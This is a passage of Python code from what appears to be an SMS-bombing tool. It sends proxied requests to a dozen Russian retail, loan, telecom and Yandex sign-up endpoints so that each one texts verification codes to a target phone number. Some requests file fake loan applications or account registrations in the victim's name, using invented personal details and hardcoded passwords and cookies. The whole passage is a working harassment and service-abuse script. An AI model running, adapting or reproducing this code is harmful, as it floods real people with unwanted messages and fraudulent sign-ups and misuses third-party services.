                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': user,
                        'x-ott-cookie': ''
                    }

                    payload = {
                        "phone": "+" + phone,
                        "reseller": ""
                    }

                    await session.patch(
                        'https://www.onetwotrip.com/_auth/profile/phone/with-confirm', json=payload, headers=header,
                        proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'Host': 'id.x5.ru',
                        'Connection': 'keep-alive',
                        'Content-Length': '62',
                        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                        'Content-Type': 'text/plain;charset=UTF-8',
                        'sec-ch-ua-mobile': '?0',
                        'User-Agent': user,
                        'sec-ch-ua-platform': '"Windows"',
                        'Accept': '*/*',
                        'Origin': 'https://id.x5.ru',
                        'Sec-Fetch-Site': 'same-origin',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Dest': 'empty',
                        'Referer': 'https://id.x5.ru/',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                        'Cookie': 'ADRUM_X5ID_ID=c244c0e7-8aa6-48b7-9338-5afdddecfff7; client_id=scan-go; _ym_uid=166759288675677947; _ym_d=1667592886; _ym_isad=1; NSC_je_djq_l8t_31443_IUUQT_OB_WT=ffffffffc3a06eea45525d5f4f58455e445a4a424ce3; TS01f13338=01a93f754713688a8c7e681ee5acee46e42ed7540cc2faf718491f599a7aebf53cfc448b16c99bd8ef8a311e991b82971d9f63d60a52d59702582f1819df7def40295d823c; TS9f472ee0027=08549da071ab200080e88c8e8e79e0a43eec4808dc4dbf3994e4c7202a42afcb9ff6e8076bae3b9a083c8fa200113000306ff3aaede77deedd6aa63205e1b29bbdaf2a4c116f66a0c6d4cefe4d22b0b7ba3d19b0aaa7c1d572af87f3342ab1a8'
                    }

                    payload = {"query": "{ user_credentials(login:\"" + phone + "\") {login}}"}

                    await session.post('https://id.x5.ru/graphql', json=payload, headers=header, proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()

                    header = {
                        'Host': 'id.x5.ru',
                        'Connection': 'keep-alive',
                        'Cache-Control': 'max-age=0',
                        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'Upgrade-Insecure-Requests': '1',
                        'User-Agent': user,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'Sec-Fetch-Site': 'same-origin',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-User': '?1',
                        'Sec-Fetch-Dest': 'document',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                        'Cookie': f'AUTH_SESSION_ID=6946e902-5a34-4fff-8bb3-0abd0b9d916f.keycloak-1; AUTH_SESSION_ID_LEGACY=6946e902-5a34-4fff-8bb3-0abd0b9d916f.keycloak-1; TS011f02d7=01a93f754761231efd74e3f1bc015aef76f6b41547c2faf718491f599a7aebf53cfc448b16c99bd8ef8a311e991b82971d9f63d60a715a7a8bb3c6ad1dcd9b67582d8df48fd8f8552a5708f6d529090241346b5b9394f59e54e3e3ac9ba846810106dc79dd2a5948f9a0ae79f8ccd5359726c54685e1c92736c1249661e86bbbdca5deae36a5f9dbab518e52b0978ba1464a5e28d65132783f29cad08085178b3c1df53330; TS01a01a08=01a93f7547b2ffba6af8adcef0b38f12c0669903efc2faf718491f599a7aebf53cfc448b16c99bd8ef8a311e991b82971d9f63d60aa1b652b97a98d0b3af6d12de55d1f35e2319dbd39c047a742f2e8e74069de664f82800cb7876ba8fbd385e9c3b65d0df416ca669d31d0ce785cc787fc30f754ee2cc4629ca8079708cff99e1301a8528; ADRUM_X5ID_ID=c244c0e7-8aa6-48b7-9338-5afdddecfff7; client_id=scan-go; _ym_uid=166759288675677947; _ym_d=1667592886; _ym_isad=1; TS01f13338=01a93f754713688a8c7e681ee5acee46e42ed7540cc2faf718491f599a7aebf53cfc448b16c99bd8ef8a311e991b82971d9f63d60a52d59702582f1819df7def40295d823c; loginHint={phone}; recaptcha_token=undefined; recaptcha_enable=false; recaptcha_hidden=false; recaptcha_pkey=6Lchf7MaAAAAAHbkxKLpB18bW27aP6JHw9Vi9ryd; ym_enable=true; ym_account_code=83748952; theme=scan-go; theme_idp=; action=register; UDI_1=rzfA5DILPx5i; UDI_2=b5MB94pzaA%3D%3D; TS9f472ee0027=08549da071ab20005a71cf8b4dbd7ccf36ba534867106999e5a7d74dfe5a333e46de8b528869c35c08611e2f66113000e9ceba28e645960145de1e7ee7439deaae9b3cc0da32656772de534296faf9268fa62aeaec39477b613092f92e71c65d'
                    }

                    await session.get(
                        'https://id.x5.ru/auth/realms/ssox5id/protocol/openid-connect/registrations?client_id=scan-go&redirect_uri=https%3A%2F%2Fid.x5.ru%2Fsuccess&state=7d96c6bf-1450-4153-be7e-c70261f56f74&response_mode=fragment&response_type=code&scope=openid%20offline_access&nonce=e9397d57-9fdd-4f8b-a251-a6f27908f064&ui_locales=ru',
                        headers=header, proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'accept': 'application/json, text/plain, */*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'fr-FR,fr',
                        'content-length': '368',
                        'content-type': 'application/json;charset=UTF-8',
                        'cookie': '__ddg1_=7adIg7X1SQ3s1sqTbKQz; PHPSESSID=a840033f0d2b10e34442f83013bb3f0f; partner=zseo',
                        'origin': 'https://borrow.zaymigo.com',
                        'referer': 'https://borrow.zaymigo.com/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': user
                    }

                    payload = {"jsonrpc": "2.0", "id": "15930021-2bf0-4be4-acef-065304196abb", "method": "create",
                               "params": {
                                   "borrower": {"surname": "Пупкин", "name": "Василий", "patronymic": "Андреевич",
                                                "patronymicNotExists": False, "phone": "+" + phone, "email": email,
                                                "phoneParams": []},
                                   "term": 12, "amount": 10000,
                                   "agreements": [{"name": "assignment_of_claims", "val": True}]}}

                    await session.post('https://borrow.zaymigo.com/rpc/v1', json=payload, headers=header, proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'accept': 'application/json, text/plain, */*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'fr-FR,fr',
                        'content-length': '224',
                        'content-type': 'application/json',
                        'cookie': '_ga=GA1.2.2108841258.1667680421; _gid=GA1.2.1628483400.1667680421; tmr_lvid=5c385c2b38e5657a71fb6f8ccf348cf0; tmr_lvidTS=1667680421368; _ym_uid=1667680422433564150; _ym_d=1667680422; _ym_isad=2; _ym_visorc=w; supportOnlineTalkID=ePvRx7CdRMpAMGC57X7IPaLHCSGEI8mL; __cfruid=354aabc5d3d3f1aed72964ff31d4d7043119adac-1667680508; ec_id=b22e8141-a6a2-49e9-addf-d0958d4b2bef; tmr_detect=0%7C1667680526135; deviceUid=ff004018-91ab-4913-9761-9c8c510136c2; tmr_reqNum=15',
                        'origin': 'https://adengi.ru',
                        'referer': 'https://adengi.ru/registration/personal',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': user,
                        'x-device-uid': 'b22e8141-a6a2-49e9-addf-d0958d4b2bef',
                        'x-version-fe': '1666591147478'
                    }

                    payload = {
                        "email": "e0grijoekg3_dwdw@hotmail.com",
                        "firstName": "Василий",
                        "hash": "a6ac90134b55d015bd2731fd4e2f06d3",
                        "lastName": "Пупин",
                        "middleName": "Иванович",
                        "phone": phone,
                        "timestamp": 1667680555,
                        "via": "sms"
                    }

                    await session.post('https://adengi.ru/rest/v1/registration/code/send', json=payload, headers=header,
                                  proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'fr-FR,fr',
                        'content-length': '117',
                        'content-type': 'application/json',
                        'cookie': 'utid=uRELsmNka8x+akk1EoeDAg==; uteka_city_id=47; _ru_yandex_autofill=not_available',
                        'origin': 'https://krym.uteka.ru',
                        'platform': 'Desktop',
                        'referer': 'https://krym.uteka.ru/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': user,
                        'version': 'b835b033'
                    }

                    payload = {"jsonrpc": "2.0", "id": 6, "method": "auth.GetCode",
                               "params": {"phone": phone[1:], "mustExist": False, "sendRealSms": True}}

                    await session.post('https://krym.uteka.ru/rpc/?method=auth.GetCode', json=payload, headers=header,
                                  proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'Accept': 'application/json',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'fr-FR,fr',
                        'Authorization': '',
                        'Cache-Control': 'max-age=0',
                        'Connection': 'keep-alive',
                        'Content-Length': '82',
                        'Content-Type': 'application/json',
                        'Cookie': 'zdr_customer_external_id=44e62396-1cee-4165-80a3-8ce848633410; storage-shipment=%7B%22stockId%22%3A0%2C%22cityId%22%3A1%2C%22shipAddressId%22%3A0%2C%22shipAddressTitle%22%3A%22%22%2C%22stockTitle%22%3A%22%22%7D; deviceId=6adada4b-b83b-406a-ac5b-b6101d282cdc; is-converted-basket=true; is-converted-liked=true; qrator_jsid=1667778933.193.ee7fMuSZ0aiaAQ0h-9qis1t0fph2cphoe2s5j19q05nb2m296',
                        'Host': 'zdorov.ru',
                        'Origin': 'https://zdorov.ru',
                        'Referer': 'https://zdorov.ru/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-origin',
                        'User-Agent': user
                    }

                    payload = {
                        'phone': phone,
                        'deviceId': '6adada4b-b83b-406a-ac5b-b6101d282cdc',
                        'term': 2
                    }

                    await session.post('https://zdorov.ru/backend/api/customer/confirm', json=payload, headers=header,
                                  proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'Accept': '*/*',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'fr-FR,fr',
                        'Connection': 'keep-alive',
                        'Content-Length': '101',
                        'Content-type': 'application/vnd.api+json',
                        'Cookie': 'guid_city=0c5b2444-70a0-4932-980c-b4dc0d3f02b5; name_city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; guid_region=0c5b2444-70a0-4932-980c-b4dc0d3f02b5; guid_country=8aa15da9-92a4-4530-ab74-1992c973c539; region_timezone=UTC%2B3%3A00; ab-test-user-id=b81234b62c57e7db8f97bb8c5aae7d2dc5a20488c38e1f6963ee8a14a3356f7da%3A2%3A%7Bi%3A0%3Bs%3A15%3A%22ab-test-user-id%22%3Bi%3A1%3Bs%3A32%3A%22933133d1ca8f2277c2dbc5671647b30d%22%3B%7D; fuser_id=400a9f05c3d4eea2e6a463167ceffc5a9113a569cfa9a16392484053b87bfcaaa%3A2%3A%7Bi%3A0%3Bs%3A8%3A%22fuser_id%22%3Bi%3A1%3Bs%3A32%3A%2224e973c408cc57099eac88d53ad12205%22%3B%7D; PHPSESSID=0hd82290tod529ln49unqlitke; _csrf=ab463b1a39cb814c72899b49f7e46e245f5ca7b88de51eda4075fd2da58abc93a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22-qTZJe5FI0mRe2WzkLYoSlrqTgr4wVOJ%22%3B%7D; inova_p_sid=qol791i_221109090955; windowDate=2022%2011%2009',
                        'Host': 'sokolov.ru',
                        'Origin': 'https://sokolov.ru',
                        'Referer': 'https://sokolov.ru/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-origin',
                        'User-Agent': user
                    }

                    payload = {
                        "data": {"type": "login",
                                 "attributes": {"phone": phone, "uid_captcha": None, "code_captcha": None}}}

                    await session.post('https://sokolov.ru/api/v4/profile/user/send-code', json=payload, headers=header,
                                  proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    payload = {"data": {"type": "requestSMS", "attributes": {"phone": "+" + phone}}}

                    header = {
                        'Accept': 'application/json, text/plain, */*',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'fr-FR,fr',
                        'Connection': 'keep-alive',
                        'Content-Length': '68',
                        'Content-Type': 'application/json',
                        'Cookie': 'xid=f977bd6a-7555-4825-8c30-2f80517a7c81; catalogGender=women; uuid=84513f80-afe7-4390-b9ab-cbef7219cdc9; siteVer=1.0.0; _slfs=1668014274236; _slid=636be0af01b07254b104fe53; _slsession=06C229F2-EBA7-43B8-BE6D-ED83E1A61A4E; actual-checkout-type=cart; gtmc_userAuth=0; __zzatw-tsum=MDA0dC0cTApcfEJcdGswPi17CT4VHThHKHIzd2VfRGwkGXtfUEBcUn4qFhV/bShMDz5ePT5vMTE7ah5meGBSS1Y/dRdZRkE2XBpLdWUJCzowJS0xViR8SylEW1MJJRoVeXIoVg0QVy8QLj9hTixcIggWEU0hF0ZaFXtDPGMMcRVNfX0mNGd/ImUrOVURCBISIGNVWml1WQhDThgSPV8qWFcMNHhlEENYfXFrL2R7RSRfHDx1ZS8zaWVpcC9gIBIlEU0hF0ZaFXtDLGAMcRVcQ0d1cyo/ZyRkTl8nP0ccOmlRJD4yXhA8dWUJCzowJS0xZid8Syk1HREyXldVNDtnQXt1IHJ+FDllDFcnHXgdYngqIg==H7n1MA==; wishlist_sid=kNvw-umbO4vBn8GUbN3D3m8Maq684e8z; gtmc_release=19257c11ea8e8373036b532c32b28dc6458b591b; gtmc_city=%D0%A1%D1%82%D1%80%D0%B0%D1%81%D0%B1%D1%83%D1%80%D0%B3; gtmc_region=null; gtmc_country=%D0%A4%D1%80%D0%B0%D0%BD%D1%86%D0%B8%D1%8F; x-wishlist-sid-local=kNvw-umbO4vBn8GUbN3D3m8Maq684e8z; gtmc_cart=%7B%22cnt%22%3A%5B%5D%2C%22id%22%3A%5B%5D%2C%22cd6%22%3A%5B%5D%7D; gssc213163=; cfidsw-tsum=dsZFD7+B/2p9PMHHJNQqYExT6T5U4qNwihY5lBkV0eUzJU1q7C2PrWqNuqIwCpyXPxlqjuW3jfERBYUVyww8SQCyVjhYxN/EjD0ErEjNEwOovrydI+AOGc6L7I9WID7Jm2p1vvfA4Qa7qtcn8PyLhmJGCjKTPqPnSm/C; cfidsw-tsum=dsZFD7+B/2p9PMHHJNQqYExT6T5U4qNwihY5lBkV0eUzJU1q7C2PrWqNuqIwCpyXPxlqjuW3jfERBYUVyww8SQCyVjhYxN/EjD0ErEjNEwOovrydI+AOGc6L7I9WID7Jm2p1vvfA4Qa7qtcn8PyLhmJGCjKTPqPnSm/C; gsscw-tsum=dJzFkoZnrNwUdl/mSDzQo81riC8qq0GIsZzhPoLf0pZbmGjgRYPcM0QWcCFS7kRNN1aHi7mPHqeUa0A3H9gCx77HRnAF9GCMKyoeoR/wxTE2cjEVVe1BRX45yL//NylMoPtcS7YG1Qk9Nr47WK5l+plq0NMS1PeKrSRLRtgMuqcuMW8KQJArwzF1EBHLsSr9he4hueRZ55gl/DHmCBHWblQMRKQJP4gdDB2bpqReQMdRJQPf5OJSqXSR+X7Gyo6s5rwRHPY43wDGgmRx2uxB; fgsscw-tsum=HM2a24aeaad3ebe9f3acf27c1860f9e7d6769237',
                        'Host': 'api.tsum.ru',
                        'Origin': 'https://www.tsum.ru',
                        'Referer': 'https://www.tsum.ru/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-site',
                        'User-Agent': user,
                        'X-Client-Date': '09.11.2022, 18:18:06',
                        'X-Site-Region': 'RU',
                        'X-Uid': '84513f80-afe7-4390-b9ab-cbef7219cdc9',
                        'X-XID': 'f977bd6a-7555-4825-8c30-2f80517a7c81'
                    }

                    await session.post('https://api.tsum.ru/v2/authorize/request-sms', json=payload, headers=header,
                                  proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'Accept': 'application/json, text/plain, */*',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'fr-FR,fr',
                        'Connection': 'keep-alive',
                        'Content-Length': '51',
                        'Content-Type': 'application/json',
                        'Cookie': 'SessionID=baMlJmKhzoYnXn2NFKHNsQuF0hUrwWnKpjcm5VLEkVU',
                        'Host': 'bmp.megafon.tv',
                        'Origin': 'https://megafon.tv',
                        'Referer': 'https://megafon.tv/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-site',
                        'User-Agent': user
                    }

                    payload = {
                        'msisdn': "+" + phone,
                        'password': "200147200147"
                    }

                    await session.post('https://bmp.megafon.tv/api/v10/auth/register/msisdn', json=payload, headers=header,
                                  proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'Accept': '*/*',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'fr-FR,fr',
                        'Connection': 'keep-alive',
                        'Content-Length': '107',
                        'content-Type': 'application/json',
                        'Cookie': 'suid=69c5eebce8dd622b0c61536c8880755b.bbb938e4d6d90b9ea4f49bd33d6b9228; autoru_sid=a%3Ag636be2842qn56nfnrvce1paem2ph581.1e6a0abd44cad0e79c8e9472449946ca%7C1668014724703.604800.tb-QtFaltosbNGBHFhXuUw.PIb8E2rWYxc1npgvR-99UIXOd3VYt8YlJqswR1Yd1nM; autoruuid=g636be2842qn56nfnrvce1paem2ph581.1e6a0abd44cad0e79c8e9472449946ca; autoru_gdpr=1; spravka=dD0xNjY4MDE0NzQwO2k9MTUxLjEwNi4xMi4yNDY7RD1DMzVBNEZGODRDMDg4OTU3MkRGOTREMEFCRTM5M0NBOTE2N0JFRjBENzU0QTIwRTgwODM2OTE4NEFFMUI1MTFEQzE3N0FDQjk7dT0xNjY4MDE0NzQwNjg1ODYyNjQyO2g9YTU5NDM0N2U1ZGMyYWEwZmZlZTUzMGQ1YzFlYjQ0YTU=; _yasc=BfGUGpXLHtiBxKt6L6s4IsWKTSltQon0caSV3VQUM02jgcteHq6J+3znIWK0; _csrf_token=99d7b5be3d19e4c301314bbc99ebfe4f59c6fd942c82865f',
                        'Host': 'auth.auto.ru',
                        'Origin': 'https://auth.auto.ru',
                        'Referer': 'https://auth.auto.ru/login/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-origin',
                        'User-Agent': user,
                        'x-csrf-token': '99d7b5be3d19e4c301314bbc99ebfe4f59c6fd942c82865f',
                        'x-requested-with': 'XMLHttpRequest'
                    }

                    payload = {"items": [
                        {"path": "auth/login-or-register", "params": {"phone": phone, "retpath": "https://auto.ru/"}}]}

                    await session.post('https://auth.auto.ru/-/ajax/auth/', json=payload, headers=header)
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'Accept': '*/*',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'fr-FR,fr',
                        'Connection': 'keep-alive',
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'Cookie': 'yandexuid=4238775361667427470; yuidss=4238775361667427470; i=iwBU4dLllApgR5zO7x6NMHzwa4lW+qL+AFenI96QJ+49STguLe/J4hzdyp+Zrn+fZ6mJi2kZG+SqL+g6zw9yBDzFolQ=; ymex=1982787470.yrts.1667427470#1982787470.yrtsi.1667427470; uniqueuid=378561771668018560; _yasc=vrm8+veH/z5e9Zs1+cHxwy76ekSBmkVGwxBYwKATO1VvAOGMnHX9XKcQYAc/wYk=',
                        'Host': 'passport.yandex.ru',
                        'Origin': 'https://passport.yandex.ru',
                        'Referer': 'https://passport.yandex.ru/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-origin',
                        'User-Agent': user,
                        'X-Requested-With': 'XMLHttpRequest'
                    }

                    r = await session.get(
                        'https://passport.yandex.ru/registration?retpath=https%3A%2F%2Fsso.passport.yandex.ru%2Fprepare%3Fuuid%3D2b4f2f34-4209-48dc-9fbc-a387c073dcfd%26goal%3Dhttps%253A%252F%252Fya.ru%252F%26finish%3Dhttps%253A%252F%252Fpassport.yandex.ru%252F&process_uuid=fdb2fdab-53b3-4b8c-b4ee-7208186098dc',
                        headers=header, proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()

                    str1 = str(r.text)
                    str2 = str1[str1.find('name="track_id"'):]
                    str3 = str2.replace('name="track_id" value="', '')
                    str4 = ''

                    for i in range(len(str3)):
                        str4 += str3[i]
                        if str3[i] == '"':
                            break

                    str4 = str4[:-1]

                    header = {
                        'Accept': 'application/json, text/javascript, */*; q=0.01',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'fr-FR,fr',
                        'Connection': 'keep-alive',
                        'Content-Length': '183',
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'Cookie': 'yandexuid=4238775361667427470; yuidss=4238775361667427470; i=iwBU4dLllApgR5zO7x6NMHzwa4lW+qL+AFenI96QJ+49STguLe/J4hzdyp+Zrn+fZ6mJi2kZG+SqL+g6zw9yBDzFolQ=; ymex=1982787470.yrts.1667427470#1982787470.yrtsi.1667427470; uniqueuid=378561771668018560; _yasc=vrm8+veH/z5e9Zs1+cHxwy76ekSBmkVGwxBYwKATO1VvAOGMnHX9XKcQYAc/wYk=',
                        'Host': 'passport.yandex.ru',
                        'Origin': 'https://passport.yandex.ru',
                        'Referer': 'https://passport.yandex.ru/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-origin',
                        'User-Agent': user,
                        'X-Requested-With': 'XMLHttpRequest'
                    }

                    payload = {
                        'track_id': str4,
                        'csrf_token': '964346147709db41c197808a04486455c1113df0:1668018564963',
                        'password': 'Hoho_HO123',
                        'login': 'korotkovateng1987-qw',
                        'phone_number': phone
                    }

                    await session.post('https://passport.yandex.ru/registration-validations/password', data=payload,
                                  headers=header, proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()

                    header = {
                        'Accept': 'application/json, text/javascript, */*; q=0.01',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'fr-FR,fr',
                        'Connection': 'keep-alive',
                        'Content-Length': '174',
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'Cookie': 'yandexuid=4238775361667427470; yuidss=4238775361667427470; i=iwBU4dLllApgR5zO7x6NMHzwa4lW+qL+AFenI96QJ+49STguLe/J4hzdyp+Zrn+fZ6mJi2kZG+SqL+g6zw9yBDzFolQ=; ymex=1982787470.yrts.1667427470#1982787470.yrtsi.1667427470; uniqueuid=378561771668018560; _yasc=vrm8+veH/z5e9Zs1+cHxwy76ekSBmkVGwxBYwKATO1VvAOGMnHX9XKcQYAc/wYk=',
                        'Host': 'passport.yandex.ru',
                        'Origin': 'https://passport.yandex.ru',
                        'Referer': 'https://passport.yandex.ru/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-origin',
                        'User-Agent': user,
                        'X-Requested-With': 'XMLHttpRequest'
                    }

                    payload = {
                        'track_id': str4,
                        'csrf_token': '964346147709db41c197808a04486455c1113df0:1668018564963',
                        'number': phone,
                        'isCodeWithFormat': True,
                        'confirm_method': 'by_sms'
                    }

                    await session.post('https://passport.yandex.ru/registration-validations/phone-confirm-code-submit',
                                  data=payload, headers=header, proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'accept': 'application/json, text/plain, */*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'fr-FR,fr',
                        'content-length': '69',
                        'content-type': 'application/x-www-form-urlencoded',
                        'cookie': 'anonymous-consents=%5B%5D; abtc=787EC619484F2A7B4C166802604530920674; abtc-text-button_2=default_text; abtc-story-test_5=story_exist; abtc-checkout-button_2=active_button; abtc-crm-test_3=owm_crm; abtc-fast-buy-listing_1=fast_buy_listing; cookie-notification=NOT_ACCEPTED; ROUTE=.accstorefront-cbd86fdb8-r9fqp; AKA_A2=A; akaas_sn_www_shoppinglive_ru=2147483647~rv=14~id=02330a70b8ea956d92b323dd5a0c4036~rn=Traffic%20Shift%20RU%20clone%201; userWasLogin=true; JSESSIONID=9296AB25A1624615EB76E2B2065219A5.accstorefront-cbd86fdb8-r9fqp; exp_id=default_text/fast_buy_listing/story_exist/active_button/owm_crm; sl-cart=2d001440-4742-42b0-a799-97ec1f86ea05',
                        'origin': 'https://www.shoppinglive.ru',
                        'referer': 'https://www.shoppinglive.ru/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': user
                    }

                    payload = {
                        'mobilePhone': phone[1:],
                        'CSRFToken': '00bc3ff8-f081-483d-ab0e-bb026785114f'
                    }

                    await session.post('https://www.shoppinglive.ru/phone-verification/send-code', data=payload,
                                  headers=header,
                                  proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'Accept': 'application/json, text/plain, */*',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'fr-FR,fr',
